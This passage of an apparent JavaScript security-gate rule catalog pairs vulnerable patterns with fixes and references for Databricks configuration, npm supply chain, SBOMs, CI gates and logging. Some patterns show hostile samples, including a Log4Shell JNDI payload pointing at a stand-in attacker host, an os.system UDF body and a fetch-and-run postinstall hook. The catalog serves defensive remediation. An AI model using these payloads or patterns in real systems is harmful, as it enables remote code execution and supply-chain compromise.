		explanation: "A databricks_token with lifetime_seconds of -1/0 or unset never expires, so a leaked or orphaned PAT grants indefinite access. Set an explicit short lifetime (e.g. <= 3600), inventory and revoke non-expiring PATs, tag each with an owner, and prefer OAuth M2M service-principal tokens that auto-refresh.",
		references: ["CWE-613", "CWE-798", "NIST SP 800-53 IA-5", "Databricks Token docs"]
	},
	"DATABRICKS_TOKEN_RESOURCE_LONG_LIVED": {
		pattern: "resource \"databricks_token\" \"t\" { lifetime_seconds = 31536000 } // 1-year admin token",
		fix: "resource \"databricks_token\" \"t\" { lifetime_seconds = 3600 }\n// scope the service principal to least privilege (no allow_cluster_create/admin); rotate automatically",
		explanation: "A databricks_token with a very long lifetime (or attached to an admin service principal) is a high-value, long-lived credential. Set a short lifetime_seconds and rotate automatically, scope service principals to least privilege (remove allow_cluster_create/admin unless required), and prefer OAuth M2M tokens over static token resources.",
		references: ["CWE-613", "NIST SP 800-53 IA-5", "Databricks Token docs"]
	},
	"DATABRICKS_UC_BROAD_GRANT": {
		pattern: "GRANT ALL PRIVILEGES ON CATALOG main TO `account users`; -- or MANAGE to all users",
		fix: "GRANT USE CATALOG ON CATALOG main TO `data-analysts`;\nGRANT USE SCHEMA, SELECT ON SCHEMA main.sales TO `data-analysts`;\n-- reserve MANAGE/OWNERSHIP for a small data-governance group",
		explanation: "Granting ALL PRIVILEGES or MANAGE on a catalog/schema to the whole-account users group hands every user broad or administrative access to governed data. Grant least-privilege (USE CATALOG, USE SCHEMA, SELECT) to specific functional groups, and reserve MANAGE/OWNERSHIP for a small data-governance group.",
		references: ["CWE-269", "NIST SP 800-53 AC-6", "Databricks Unity Catalog docs"]
	},
	"DATABRICKS_UNTRUSTED_FUNCTION": {
		pattern: "CREATE FUNCTION f(...) RETURNS ... LANGUAGE PYTHON AS $$ import os; os.system(cmd) $$;",
		fix: "-- restrict who can CREATE FUNCTION; forbid os.system/subprocess/eval in UDF bodies\n-- load JARs only from a checksummed Unity Catalog volume, not dbfs:/ or external URLs\n-- run UDFs on isolation-enforced (USER_ISOLATION) clusters",
		explanation: "A CREATE FUNCTION using Python, an external JAR, or shell from an untrusted source executes arbitrary code with the cluster's privileges. Restrict who can CREATE FUNCTION, load JARs only from controlled, checksummed Unity Catalog volumes, forbid os.system/subprocess/eval in UDF bodies, and run on isolation-enforced clusters.",
		references: ["CWE-94", "CWE-829", "NIST SP 800-53 SI-10", "Databricks UDF docs"]
	},
	"DATABRICKS_WEAK_CLUSTER_ISOLATION": {
		pattern: "cluster { data_security_mode = \"NONE\" } // table ACLs disabled, no UC isolation",
		fix: "cluster {\n  data_security_mode = \"USER_ISOLATION\"  # or \"SINGLE_USER\" for ML\n  spark_conf = { \"spark.databricks.acl.dfAclsEnabled\" = \"true\" }\n}\n// migrate to Unity Catalog for centralized governance",
		explanation: "A cluster with data_security_mode NONE/LEGACY and table ACLs disabled provides no Unity Catalog isolation, so users on the cluster can read each other's data and bypass access controls. Set USER_ISOLATION (or SINGLE_USER for ML), enable table ACLs, and migrate governance to Unity Catalog.",
		references: ["CWE-284", "NIST SP 800-53 AC-4", "Databricks Cluster Access Mode docs"]
	},
	"DATABRICKS_WORKSPACE_CONF_WEAK": {
		pattern: "databricks_workspace_conf { custom_config = { enableDbfsFileBrowser=\"true\", enableExportNotebook=\"true\" } }",
		fix: "databricks_workspace_conf { custom_config = {\n  enforceUserIsolation = \"true\"\n  enableDbfsFileBrowser = \"false\"\n  enableExportNotebook = \"false\"\n} }\n// disable enableTokensConfig where OAuth is available",
		explanation: "Workspace configuration that enables the DBFS file browser, notebook export, or PATs (and disables user isolation) opens data-exfiltration paths and weakens controls. Set enforceUserIsolation=true, disable enableDbfsFileBrowser and enableExportNotebook, disable enableTokensConfig where OAuth is available, and govern workspace conf via Terraform.",
		references: ["CWE-16", "NIST SP 800-53 CM-6", "Databricks Workspace Settings docs"]
	},

	// -------------------------------------------------------------------------
	// Dependencies / supply chain
	// -------------------------------------------------------------------------
	"DEP_CONFUSION_UNSCOPED": {
		pattern: "\"dependencies\": { \"internal-auth-lib\": \"1.0.0\" } // unscoped private package name",
		fix: "\"dependencies\": { \"@your-org/internal-auth-lib\": \"1.0.0\" } // private scope\n// configure the scope registry in .npmrc: @your-org:registry=https://npm.your-org.internal",
		explanation: "An unscoped private package name can be hijacked by dependency confusion: an attacker publishes a higher-versioned public package with the same name, and the installer resolves theirs instead. Scope all internal packages under a private namespace (@your-org/...), point that scope at your private registry, or register empty placeholder packages on npm to block squatting.",
		references: ["CWE-427", "MITRE ATT&CK T1195.001", "SLSA L2", "OWASP A06:2021"]
	},
	"DEP_CVE_ACTIVELY_EXPLOITED": {
		pattern: "// a dependency matches a CVE in CISA's Known Exploited Vulnerabilities catalog",
		fix: "npm audit fix   # or upgrade the specific package to a patched version\nnpm ci          # reinstall from the updated lockfile\n// if no patch exists: apply mitigating controls (WAF rule, feature disable) and document accepted risk",
		explanation: "A dependency here matches a CVE in CISA's KEV catalog, meaning it is being actively exploited in the wild — the highest patch priority. Upgrade or patch to a fixed version immediately, reinstall from the updated lockfile, and if no patch is available apply compensating controls and document the accepted risk with a deadline.",
		references: ["CWE-1395", "CISA KEV Catalog", "NIST SP 800-40 Rev 4", "OWASP A06:2021"]
	},
	"DEP_CVE_HIGH_EPSS": {
		pattern: "// a dependency CVE has a high EPSS score (high probability of exploitation)",
		fix: "npm audit fix   # or upgrade the affected package\nnpm ci\n// track exploit availability; treat as high urgency even before a public exploit lands",
		explanation: "A high EPSS score indicates a statistically high probability that the CVE will be exploited soon, so it warrants prioritized patching even absent a current public exploit. Upgrade the affected package, reinstall from the lockfile, and monitor for exploit availability, treating it as high urgency.",
		references: ["CWE-1395", "FIRST EPSS", "NIST SP 800-40 Rev 4", "OWASP A06:2021"]
	},
	"DEP_GITIGNORE_BYPASS_COMMITTED_SECRET": {
		pattern: "# .gitignore lists .env, but .env is already committed (tracked before it was ignored)",
		fix: "git rm --cached .env && git commit -m 'stop tracking .env'\n# rotate every credential the file held — it is still in history\n# purge history if the repo was shared: git filter-repo --path .env --invert-paths",
		explanation: ".gitignore only prevents new, untracked files from being added — a file committed before it was ignored stays tracked and its contents remain in history. Untrack it with git rm --cached, rotate every credential it contained (recoverable from history even after removal), and purge history with git-filter-repo/BFG if the repo was ever shared.",
		references: ["CWE-312", "CWE-540", "OWASP A05:2021", "NIST SP 800-53 IA-5"]
	},
	"DEP_GIT_PROTOCOL_UNPINNED": {
		pattern: "\"dependencies\": { \"lib\": \"git+https://github.com/org/lib.git#main\" } // mutable ref",
		fix: "\"dependencies\": { \"lib\": \"git+https://github.com/org/lib.git#3f9a1c2e...<40-char-sha>\" }\n// prefer a registry-published package with a lockfile integrity hash",
		explanation: "A dependency installed from a git URL pointing at a branch or tag is fetched from a mutable ref with no integrity hash, so a compromised or force-pushed branch silently injects code. Pin every git-URL dependency to an immutable commit SHA, prefer publishing to a registry with a lockfile integrity hash, and use verified https over git:// or git+http.",
		references: ["CWE-494", "SLSA L2", "NIST SP 800-218 PS-3", "OWASP A08:2021"]
	},
	"DEP_IGNORE_SCRIPTS_MISSING": {
		pattern: "# .npmrc does not set ignore-scripts=true — lifecycle scripts run on every install",
		fix: "# .npmrc (committed to the repo)\nignore-scripts=true\n# for packages that genuinely need a build step, run it explicitly / allowlisted",
		explanation: "Without ignore-scripts=true, npm executes arbitrary preinstall/postinstall scripts from every dependency during install, the primary delivery mechanism for supply-chain malware. Set ignore-scripts=true in a committed .npmrc so CI enforces it, and explicitly allowlist the few packages that legitimately need lifecycle scripts.",
		references: ["CWE-829", "CWE-94", "SLSA L2", "NIST SP 800-218 PW-4"]
	},
	"DEP_LIFECYCLE_SCRIPTS": {
		pattern: "\"scripts\": { \"postinstall\": \"node ./fetch-and-run.js\" } // auto-executed on install",
		fix: "# audit the script before trusting; disable auto-execution globally:\n# .npmrc\nignore-scripts=true\n# allowlist only vetted scripts you control",
		explanation: "Lifecycle scripts (preinstall/install/postinstall) run automatically on npm install with the developer's privileges, so a malicious or compromised package can execute arbitrary code. Audit each package's lifecycle script before trusting it, set ignore-scripts=true to block automatic execution, and explicitly allowlist scripts you have reviewed.",
		references: ["CWE-829", "CWE-94", "SLSA L2", "NIST SP 800-218 PW-4"]
	},
	"DEP_LOCAL_PATH_OVERRIDE": {
		pattern: "\"dependencies\": { \"lib\": \"file:../lib\" } // link:/file:/portal: bypasses the registry",
		fix: "\"dependencies\": { \"lib\": \"1.4.2\" } // registry-published, versioned, lockfile integrity hash\n// keep local dev linking out of committed manifests (use workspaces / a local overrides file)",
		explanation: "A dependency resolved from a local path (link:/file:/portal:) bypasses the registry and lockfile integrity, so an on-disk or CI-injected module can override a real package with unvetted code. Depend on a versioned, registry-published package with an integrity hash, keep local linking out of committed manifests, and audit CI for npm/yarn link steps.",
		references: ["CWE-427", "SLSA L2", "NIST SP 800-218 PS-3", "OWASP A08:2021"]
	},
	"DEP_LOW_SCORECARD": {
		pattern: "// dependency with a low OpenSSF Scorecard (weak maintenance / security practices)",
		fix: "// review the Scorecard at https://scorecard.dev and pin to a vetted version:\n\"dependencies\": { \"lib\": \"1.4.2\" }\n// replace consistently low-scored dependencies or document accepted risk",
		explanation: "A low OpenSSF Scorecard signals weak security practices (no branch protection, unpinned CI, few reviewers, unmaintained), raising the odds of a future compromise. Review the Scorecard details, pin to a specific vetted version, and either replace consistently low-scored dependencies with maintained alternatives or document the accepted risk.",
		references: ["CWE-1104", "OpenSSF Scorecard", "SLSA L2", "OWASP A06:2021"]
	},
	"DEP_MAINTAINER_RISK": {
		pattern: "// dependency with a history of supply-chain incidents / maintainer takeover",
		fix: "// audit current maintainer + recent publish history on npmjs.com, then pin a safe version:\n\"dependencies\": { \"lib\": \"1.4.2\" }\nnpm ci\n// replace abandoned / historically-compromised packages with maintained alternatives",
		explanation: "A dependency with a known supply-chain incident history or maintainer-takeover risk (ATT&CK T1195.001) is more likely to ship malicious code again. Audit the current maintainer and recent publish history, pin to a specific known-safe version, reinstall from the lockfile, and consider replacing abandoned or previously-compromised packages.",
		references: ["CWE-1357", "MITRE ATT&CK T1195.001", "SLSA L2", "OWASP A06:2021"]
	},
	"DEP_MISSING_INTEGRITY": {
		pattern: "// lockfile entries missing `integrity` hashes — downloads not content-verified",
		fix: "rm -f package-lock.json && npm install   # regenerate with integrity hashes\ngit add package-lock.json && git commit -m 'regenerate lockfile with integrity'\n# enforce in CI with `npm ci` (fails on missing/mismatched integrity)",
		explanation: "Missing integrity fields in the lockfile mean npm cannot verify that a downloaded package matches the expected content, allowing a substituted tarball to install silently. Regenerate the lockfile so every entry has a Subresource Integrity hash, commit it, and use npm ci in CI so builds fail on missing or mismatched integrity.",
		references: ["CWE-345", "CWE-494", "SLSA L2", "NIST SP 800-218 PS-3"]
	},
	"DEP_NO_PROVENANCE": {
		pattern: "// dependency published without npm provenance / signed attestation",
		fix: "// prefer packages published with provenance (npm 9+ --provenance):\nnpm view <pkg> --json | jq '.dist.attestations'\n// pin versions and verify signatures; for your own packages: npm publish --provenance",
		explanation: "A package without provenance/signed attestation cannot be cryptographically tied back to the source repo and build that produced it, so a tampered or spoofed publish is harder to detect. Prefer dependencies published with npm provenance, pin to specific versions, verify signatures where available, and publish your own packages with --provenance.",
		references: ["CWE-345", "SLSA L3", "NIST SP 800-218 PS-3", "OWASP A08:2021"]
	},
	"DEP_SUSPICIOUS_VERSION": {
		pattern: "\"dependencies\": { \"internal-utils\": \"999.9.9\" } // 999.* / 0.0.0 — dependency-confusion signal",
		fix: "// verify the package and its publish history before installing:\nnpm view internal-utils versions --json\n// pin the correct package/version; scope internal packages under a private namespace\n\"dependencies\": { \"@your-org/internal-utils\": \"1.4.2\" }",
		explanation: "Versions like 999.* or 0.0.0/0.0.1 on short names are a classic dependency-confusion signal — an attacker publishes an absurdly high version so the resolver picks their public package over your private one. Verify each package with npm view and inspect its publish history, pin the correct version, and use a private registry with an approved-package allowlist.",
		references: ["CWE-427", "MITRE ATT&CK T1195.001", "SLSA L2", "OWASP A06:2021"]
	},
	"DEP_TYPOSQUAT_EXTENDED": {
		pattern: "\"dependencies\": { \"lodahs\": \"^4.0.0\" } // typo of a popular package",
		fix: "\"dependencies\": { \"lodash\": \"4.17.21\" } // correct name, exact pin\n// verify on npmjs.com before reinstalling; run `npm audit`",
		explanation: "A typosquatted package name (a transposed or misspelled popular name) ships malware that runs on install. Verify each flagged package is the intended dependency, remove the typosquat, install the correctly-spelled package, audit package-lock.json, and review the package on npmjs.com before reinstalling.",
		references: ["CWE-427", "MITRE ATT&CK T1195.001", "NIST SP 800-218 PW-4", "OWASP A06:2021"]
	},

	// -------------------------------------------------------------------------
	// SBOM
	// -------------------------------------------------------------------------
	"SBOM_COMPONENT_MISMATCH": {
		pattern: "// dependencies in package.json are absent from the committed SBOM",
		fix: "syft . -o cyclonedx-json=.mcp/sbom/latest.json   # regenerate with node_modules present\ngit add .mcp/sbom/latest.json",
		explanation: "When package.json dependencies are missing from the SBOM, the SBOM no longer reflects what is actually installed, so vulnerability matching and provenance checks miss components. Regenerate the SBOM with node_modules present so all current dependencies are captured, and automate regeneration on dependency changes.",
		references: ["CWE-1104", "NTIA SBOM Minimum Elements", "SLSA L2", "NIST SP 800-218 PS-3"]
	},
	"SBOM_MISSING": {
		pattern: "// no SBOM found in the repository",
		fix: "syft . -o cyclonedx-json=.mcp/sbom/latest.json   # generate a CycloneDX SBOM\ngit add .mcp/sbom/latest.json\n# or set SECURITY_AUTO_SBOM=true to auto-generate each gate run",
		explanation: "Without an SBOM there is no authoritative inventory of components, so you cannot answer 'are we affected by CVE-X' quickly or prove provenance. Generate a CycloneDX (or SPDX) SBOM with Syft, commit it, and automate generation in CI so it stays current with every dependency change.",
		references: ["CWE-1104", "NTIA SBOM Minimum Elements", "SLSA L2", "EO 14028"]
	},
	"SBOM_STALE": {
		pattern: "// SBOM is older than 24 hours / older than the current dependency set",
		fix: "syft . -o cyclonedx-json=.mcp/sbom/latest.json   # regenerate\n# or set SECURITY_AUTO_SBOM=true to auto-regenerate on each run",
		explanation: "A stale SBOM may not list recently added or updated dependencies, so vulnerability scans against it produce false negatives. Regenerate the SBOM whenever dependencies change (and on a schedule), or enable auto-regeneration so it always reflects the current dependency set.",
		references: ["CWE-1104", "NTIA SBOM Minimum Elements", "SLSA L2", "NIST SP 800-218 PS-3"]
	},
	"SBOM_UNSIGNED": {
		pattern: "// SBOM exists but has no cosign attestation — integrity/authenticity unverifiable",
		fix: "cosign attest --predicate .mcp/sbom/latest.json --type cyclonedx <image-or-artifact>\n# store the attestation in .mcp/attestations/ and verify with `cosign verify-attestation`",
		explanation: "An unsigned SBOM can be tampered with or swapped, so consumers cannot trust that it reflects the real build. Sign the SBOM with cosign as an attestation, store the attestation alongside the artifact, and verify it in the deployment pipeline to reach SLSA provenance levels.",
		references: ["CWE-345", "SLSA L3", "Sigstore cosign docs", "NIST SP 800-218 PS-3"]
	},

	// -------------------------------------------------------------------------
	// Scanners
	// -------------------------------------------------------------------------
	"SCANNER_EXECUTION_ERROR": {
		pattern: "// a required security scanner failed to execute (crash / missing binary / permissions)",
		fix: "// reproduce and fix the scanner invocation, e.g.:\ntrivy fs --exit-code 1 .   # confirm it runs locally\n// check the binary is installed, on PATH, and has read permission on the workspace",
		explanation: "A scanner that errors out silently leaves a coverage gap — findings it would have caught are missed while the gate may still pass. Investigate why the scanner failed (missing binary, PATH, permissions, bad config), fix the invocation so it runs cleanly, and do not treat an execution error as a clean result.",
		references: ["CWE-1108", "NIST SP 800-53 RA-5", "OWASP DevSecOps Guideline"]
	},
	"SCANNER_HIGH_CVE": {
		pattern: "// a scanner reported a HIGH/CRITICAL CVE in a dependency or image",
		fix: "// update the affected package/base image to a non-vulnerable version:\nnpm audit fix   # or bump the pinned version / rebuild the image\n// check OSV.dev for patch availability and workarounds",
		explanation: "A HIGH/CRITICAL CVE reported by a scanner represents a directly exploitable weakness in a shipped component. Update the affected package or base image to a fixed version, verify against OSV.dev for patch availability and workarounds, and if no fix exists apply compensating controls and document the accepted risk.",
		references: ["CWE-1395", "NIST SP 800-40 Rev 4", "CISA KEV Catalog", "OWASP A06:2021"]
	},
	"SCANNER_TOOLCHAIN_INCOMPLETE": {
		pattern: "// required scanners are not installed or not runnable (fail-closed enforcement on)",
		fix: "// install the missing scanners (example set):\nbrew install trivy gitleaks syft grype   # or the org-approved equivalents\n// pin versions in CI and verify each runs before relying on heuristic checks",
		explanation: "When fail-closed scanner enforcement is on but required scanners are missing, the gate cannot rely on real tool coverage and would otherwise fall back to weaker heuristics. Install the missing scanners (or intentionally adjust the approved-scanner config), pin their versions in CI, and verify each is runnable so enforcement is backed by real analysis.",
		references: ["CWE-1108", "NIST SP 800-53 RA-5", "SLSA L2", "OWASP DevSecOps Guideline"]
	},

	// -------------------------------------------------------------------------
	// Required artifacts
	// -------------------------------------------------------------------------
	"ARTIFACTS_COMPLIANCE_GAP": {
		pattern: "// compliance/policy files changed but no compliance gap analysis accompanies the change",
		fix: "// add security/compliance-gap-<date>.md mapping each changed control to its requirement:\n// | Change | Framework Req (PCI DSS 4.0 / GDPR Art.32 / HIPAA §164) | Residual risk | Owner sign-off |\n// document residual risk and obtain the compliance owner's sign-off before merge",
		explanation: "Changing compliance-related files without a gap analysis means no one has verified the change still meets each mapped framework requirement, risking silent control regressions. Produce a compliance gap analysis mapping every changed control to its framework requirement (PCI DSS 4.0, GDPR Art. 32, HIPAA §164, etc.), document residual risk, and get compliance-owner sign-off.",
		references: ["NIST SP 800-53 CA-2", "PCI DSS 4.0 Req 12", "SOC 2 CC3.1", "GDPR Art. 32"]
	},
	"ARTIFACTS_MISSING": {
		pattern: "// a required artifact for the changed flow is absent (e.g. threat model for a new flow)",
		fix: "// add the required artifact matching the flow, e.g. a threat model that includes:\n// STRIDE analysis + OWASP Top-10 mapping + MITRE ATT&CK mapping + required logging + tests\n// place it under .mcp/, docs/, or security/ and link it from the PR",
		explanation: "A required security artifact for the changed flow is missing, so the change ships without the documented threat analysis, control mapping, and test/logging evidence that the gate expects. Create the artifact for the specific flow (STRIDE + OWASP + MITRE mapping plus required logging and tests) and reference it from the PR.",
		references: ["NIST SP 800-53 SA-11", "NIST SP 800-218 PW-1", "SOC 2 CC3.2", "OWASP SAMM"]
	},
	"ARTIFACTS_NO_PENTEST_SIGNOFF": {
		pattern: "// payment/auth files changed but no pentest report or sign-off is present",
		fix: "// add security/pentest-report-<date>.md (or .pdf) covering OWASP Top-10 auth/session flaws,\n// IDOR, and PCI DSS 6.3-6.5; obtain sign-off before shipping.\n// if a full pentest is pending, document interim risk acceptance with CISO sign-off",
		explanation: "Changes to payment or authentication flows carry high blast radius and are in scope for PCI DSS, so shipping them without a pentest sign-off leaves exploitable auth/session flaws unverified. Obtain a pentest report covering OWASP Top-10 auth/session issues, IDOR, and PCI DSS 6.3-6.5, place it under security/, and record interim risk acceptance with CISO sign-off if the pentest is incomplete.",
		references: ["NIST SP 800-53 CA-8", "PCI DSS 4.0 Req 6.3", "PCI DSS 4.0 Req 11.4", "OWASP ASVS"]
	},
	"ARTIFACTS_NO_REDTEAM_RESULTS": {
		pattern: "// AI/LLM files changed but no AI red-team results are present",
		fix: "// run an AI red-team covering prompt injection, indirect injection, jailbreaks, and data\n// exfiltration via outputs; document in .mcp/agent-runs/redteam-<date>.md or security/ai-findings-<date>.md.\n// resolve HIGH/CRITICAL findings before merging LLM-touching changes",
		explanation: "LLM-touching changes introduce prompt-injection, jailbreak, and data-exfiltration risks that standard scanners miss, so merging them without red-team evidence leaves those risks untested. Run an AI red-team exercise (OWASP LLM Top 10 / MITRE ATLAS), document the results, and address HIGH/CRITICAL findings before merge.",
		references: ["OWASP LLM01:2025", "MITRE ATLAS", "NIST AI 100-1", "NIST SP 800-53 CA-8"]
	},
	"ARTIFACTS_NO_SBOM": {
		pattern: "// no SBOM found in the repository for the changed dependencies",
		fix: "npx @cyclonedx/cyclonedx-npm --output-file sbom.json   # Node.js\n# python: cyclonedx-bom -o sbom.json\ngit add sbom.json   # automate in CI and include in artifact uploads (SLSA L2+)",
		explanation: "Without a committed SBOM there is no authoritative component inventory for the changed dependencies, blocking fast CVE impact analysis and provenance verification. Generate a CycloneDX or SPDX SBOM, commit it, automate its generation in CI, and include it with any artifact upload to reach SLSA Level 2+.",
		references: ["CWE-1104", "NTIA SBOM Minimum Elements", "SLSA L2", "EO 14028"]
	},
	"ARTIFACTS_NO_THREAT_MODEL": {
		pattern: "// no threat model file found in .mcp/, docs/, or security/",
		fix: "// create threat-model.md (or .json) in .mcp/, docs/, or security/ containing:\n// STRIDE analysis, OWASP Top-10 mapping, MITRE ATT&CK mapping, trust boundaries, and a data-flow diagram.\n// reference it from the PR and link it to the changed components",
		explanation: "Without a threat model, design-level risks (trust-boundary crossings, spoofing, tampering, EoP) are never enumerated, so they surface only after they are exploited. Create a threat model with STRIDE analysis, OWASP Top-10 and MITRE ATT&CK mappings, trust boundaries, and data-flow diagrams, and reference it from the PR.",
		references: ["NIST SP 800-53 SA-11", "OWASP SAMM", "SOC 2 CC3.2", "STRIDE"]
	},

	// -------------------------------------------------------------------------
	// Incident-response playbooks
	// -------------------------------------------------------------------------
	"IR_PLAYBOOK_MISSING": {
		pattern: "// no incident-response playbook found at the expected path",
		fix: "// create the IR playbook (e.g. security/incident-response.md) with all required sections:\n// detection criteria, escalation path, containment, eradication, recovery, communication,\n// post-incident review, and MTTD/MTTR targets",
		explanation: "Without an IR playbook, responders improvise during an incident, lengthening detection and recovery time and risking missed containment or notification obligations. Create a playbook covering detection criteria, escalation, containment, eradication, recovery, communication, post-incident review, and MTTD/MTTR targets.",
		references: ["NIST SP 800-61 Rev 2", "NIST SP 800-53 IR-8", "SOC 2 CC7.3", "PCI DSS 4.0 Req 12.10"]
	},
	"IR_PLAYBOOK_INCOMPLETE": {
		pattern: "// the IR playbook exists but is missing required sections",
		fix: "// add the missing sections (e.g. containment, communication, post-incident review) with\n// actionable steps — named roles, concrete commands, and decision criteria, not just headers",
		explanation: "An IR playbook missing sections (or with header-only sections) fails responders exactly where they need guidance, so the gap becomes visible only mid-incident. Fill in the missing sections with actionable, role-assigned steps and concrete criteria so the playbook is executable under pressure.",
		references: ["NIST SP 800-61 Rev 2", "NIST SP 800-53 IR-8", "SOC 2 CC7.3", "PCI DSS 4.0 Req 12.10"]
	},
	"IR_PLAYBOOK_STALE": {
		pattern: "// the IR playbook has not been reviewed/updated and may reference stale infra/contacts",
		fix: "// review and update the playbook to reflect current infrastructure, tooling, and on-call contacts;\n// record the review date and schedule quarterly reviews",
		explanation: "A stale IR playbook can send responders to decommissioned systems or unreachable contacts, delaying response when minutes matter. Review and update it to match current infrastructure and contacts, record the review date, and schedule recurring (e.g. quarterly) reviews.",
		references: ["NIST SP 800-61 Rev 2", "NIST SP 800-53 IR-8", "SOC 2 CC7.3", "PCI DSS 4.0 Req 12.10"]
	},

	// -------------------------------------------------------------------------
	// CI gate integrity
	// -------------------------------------------------------------------------
	"GATE_STEP_ABSENT": {
		pattern: "# no GitHub Actions workflow invokes the security gate (npm run ci:pr-gate)",
		fix: "# .github/workflows/security-gate.yml\njobs:\n  security-gate:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@<pinned-sha>\n      - run: npm ci\n      - run: npm run ci:pr-gate   # blocks PRs with HIGH/CRITICAL findings",
		explanation: "If no workflow runs the security gate, HIGH/CRITICAL findings never block pull-request merges, so the gate provides no enforcement. Add a step running npm run ci:pr-gate to your PR workflow and make it a required status check in branch protection.",
		references: ["CWE-1269", "SLSA L2", "NIST SP 800-218 PW-7", "OWASP DevSecOps Guideline"]
	},
	"GATE_STEP_DISABLED": {
		pattern: "# - run: npm run ci:pr-gate   # gate step commented out / disabled",
		fix: "- run: npm run ci:pr-gate   # re-enable so HIGH/CRITICAL findings block PRs",
		explanation: "A gate step that is present but commented out or disabled provides no protection — vulnerable code can merge without review. Re-enable the npm run ci:pr-gate step and keep it as a required, non-bypassable status check so it blocks PRs with HIGH/CRITICAL findings.",
		references: ["CWE-1269", "SLSA L2", "NIST SP 800-218 PW-7", "OWASP DevSecOps Guideline"]
	},
	"GATE_WORKFLOW_SELF_MODIFICATION": {
		pattern: "# security-gate.yml modified in this PR AND the gate invocation removed/commented out",
		fix: "# restore the gate step in the same PR before merging:\n- run: npm run ci:pr-gate\n# require review from a security owner for any change to security-gate.yml (CODEOWNERS)",
		explanation: "A PR that edits security-gate.yml while removing or disabling the gate invocation would bypass the gate for all future PRs — a self-modification bypass. Restore the gate step before merging, require a security-owner review (CODEOWNERS) for changes to the gate workflow, and protect the workflow file.",
		references: ["CWE-1269", "MITRE ATT&CK T1195", "SLSA L3", "NIST SP 800-218 PW-7"]
	},

	// -------------------------------------------------------------------------
	// Logging / audit
	// -------------------------------------------------------------------------
	"LOG_INJECTION": {
		pattern: "logger.info('login failed for ' + req.body.username) // raw user input into the log",
		fix: "const safeUser = String(req.body.username).replace(/[\\r\\n]/g, '_');\nlogger.info('login failed', { username: safeUser }); // structured field, newlines stripped",
		explanation: "Writing user-controlled strings to logs without stripping newlines lets an attacker forge log entries (CRLF injection) — injecting fake audit lines or splitting/erasing evidence of their activity. Strip or encode \\r and \\n from user values before logging, and prefer structured logging with the value as a discrete field.",
		references: ["CWE-117", "OWASP A09:2021", "NIST SP 800-53 AU-9"]
	},
	"LOG_JNDI_INJECTION_RISK": {
		pattern: "logger.info(`request from ${req.query.user}`) // user input interpolated into a log statement",
		fix: "const safe = String(req.query.user).replace(/\\$\\{jndi:/gi, '[blocked:');\nlogger.info('request', { user: safe });\n// on the JVM side, upgrade Log4j >= 2.17.1 and set log4j2.formatMsgNoLookups=true",
		explanation: "Interpolating user input into log statements is dangerous when logs reach a vulnerable Java/Log4j sink: a payload like ${jndi:ldap://attacker/x} triggers a JNDI lookup and remote code execution (Log4Shell, CVE-2021-44228). Sanitize user input before logging by neutralizing ${jndi: patterns, use structured fields, and patch Log4j to a fixed version.",
		references: ["CWE-117", "CVE-2021-44228", "OWASP A09:2021", "NIST SP 800-53 SI-10"]
	},
	"LOG_RETENTION_NOT_CONFIGURED": {
		pattern: "new winston.transports.File({ filename: 'app.log' }) // no maxFiles / retention policy",
		fix: "new winston.transports.File({ filename: 'app.log', maxsize: 10485760, maxFiles: 365, tailable: true });\n// ship to centralized storage with >= 12-month retention and 3 months immediately available",
		explanation: "With no log retention policy, audit logs may roll over or be lost before they are needed for incident investigation or compliance, and PCI DSS/NIST require defined retention. Configure rotation and retention (PCI DSS: at least 12 months, 3 months immediately available; NIST AU-11: risk-aligned), and ship logs to centralized, tamper-evident storage.",
		references: ["CWE-778", "PCI DSS 4.0 Req 10.5.1", "NIST SP 800-53 AU-11", "SOC 2 CC7.2"]
	},
	"AUDIT_LOGGING_DISABLED": {
		pattern: "resource \"aws_s3_bucket\" \"b\" { /* no logging block; or cloudtrail logging = false */ }",
		fix: "resource \"aws_cloudtrail\" \"main\" { enable_logging = true, is_multi_region_trail = true }\nresource \"aws_s3_bucket_logging\" \"b\" { bucket = aws_s3_bucket.b.id, target_bucket = aws_s3_bucket.logs.id, target_prefix = \"s3/\" }\n// enable deletion protection on databases and stateful resources",
		explanation: "Audit logging or deletion protection explicitly disabled in IaC means privileged actions and data access go unrecorded and resources can be silently destroyed, undermining incident response and compliance. Enable audit logging on all cloud resources, ship logs to a centralized tamper-evident store, enable deletion protection on stateful resources, and retain logs for at least a year.",
		references: ["CWE-778", "NIST SP 800-53 AU-6", "PCI DSS 4.0 Req 10", "SOC 2 CC7.2"]
	}
};
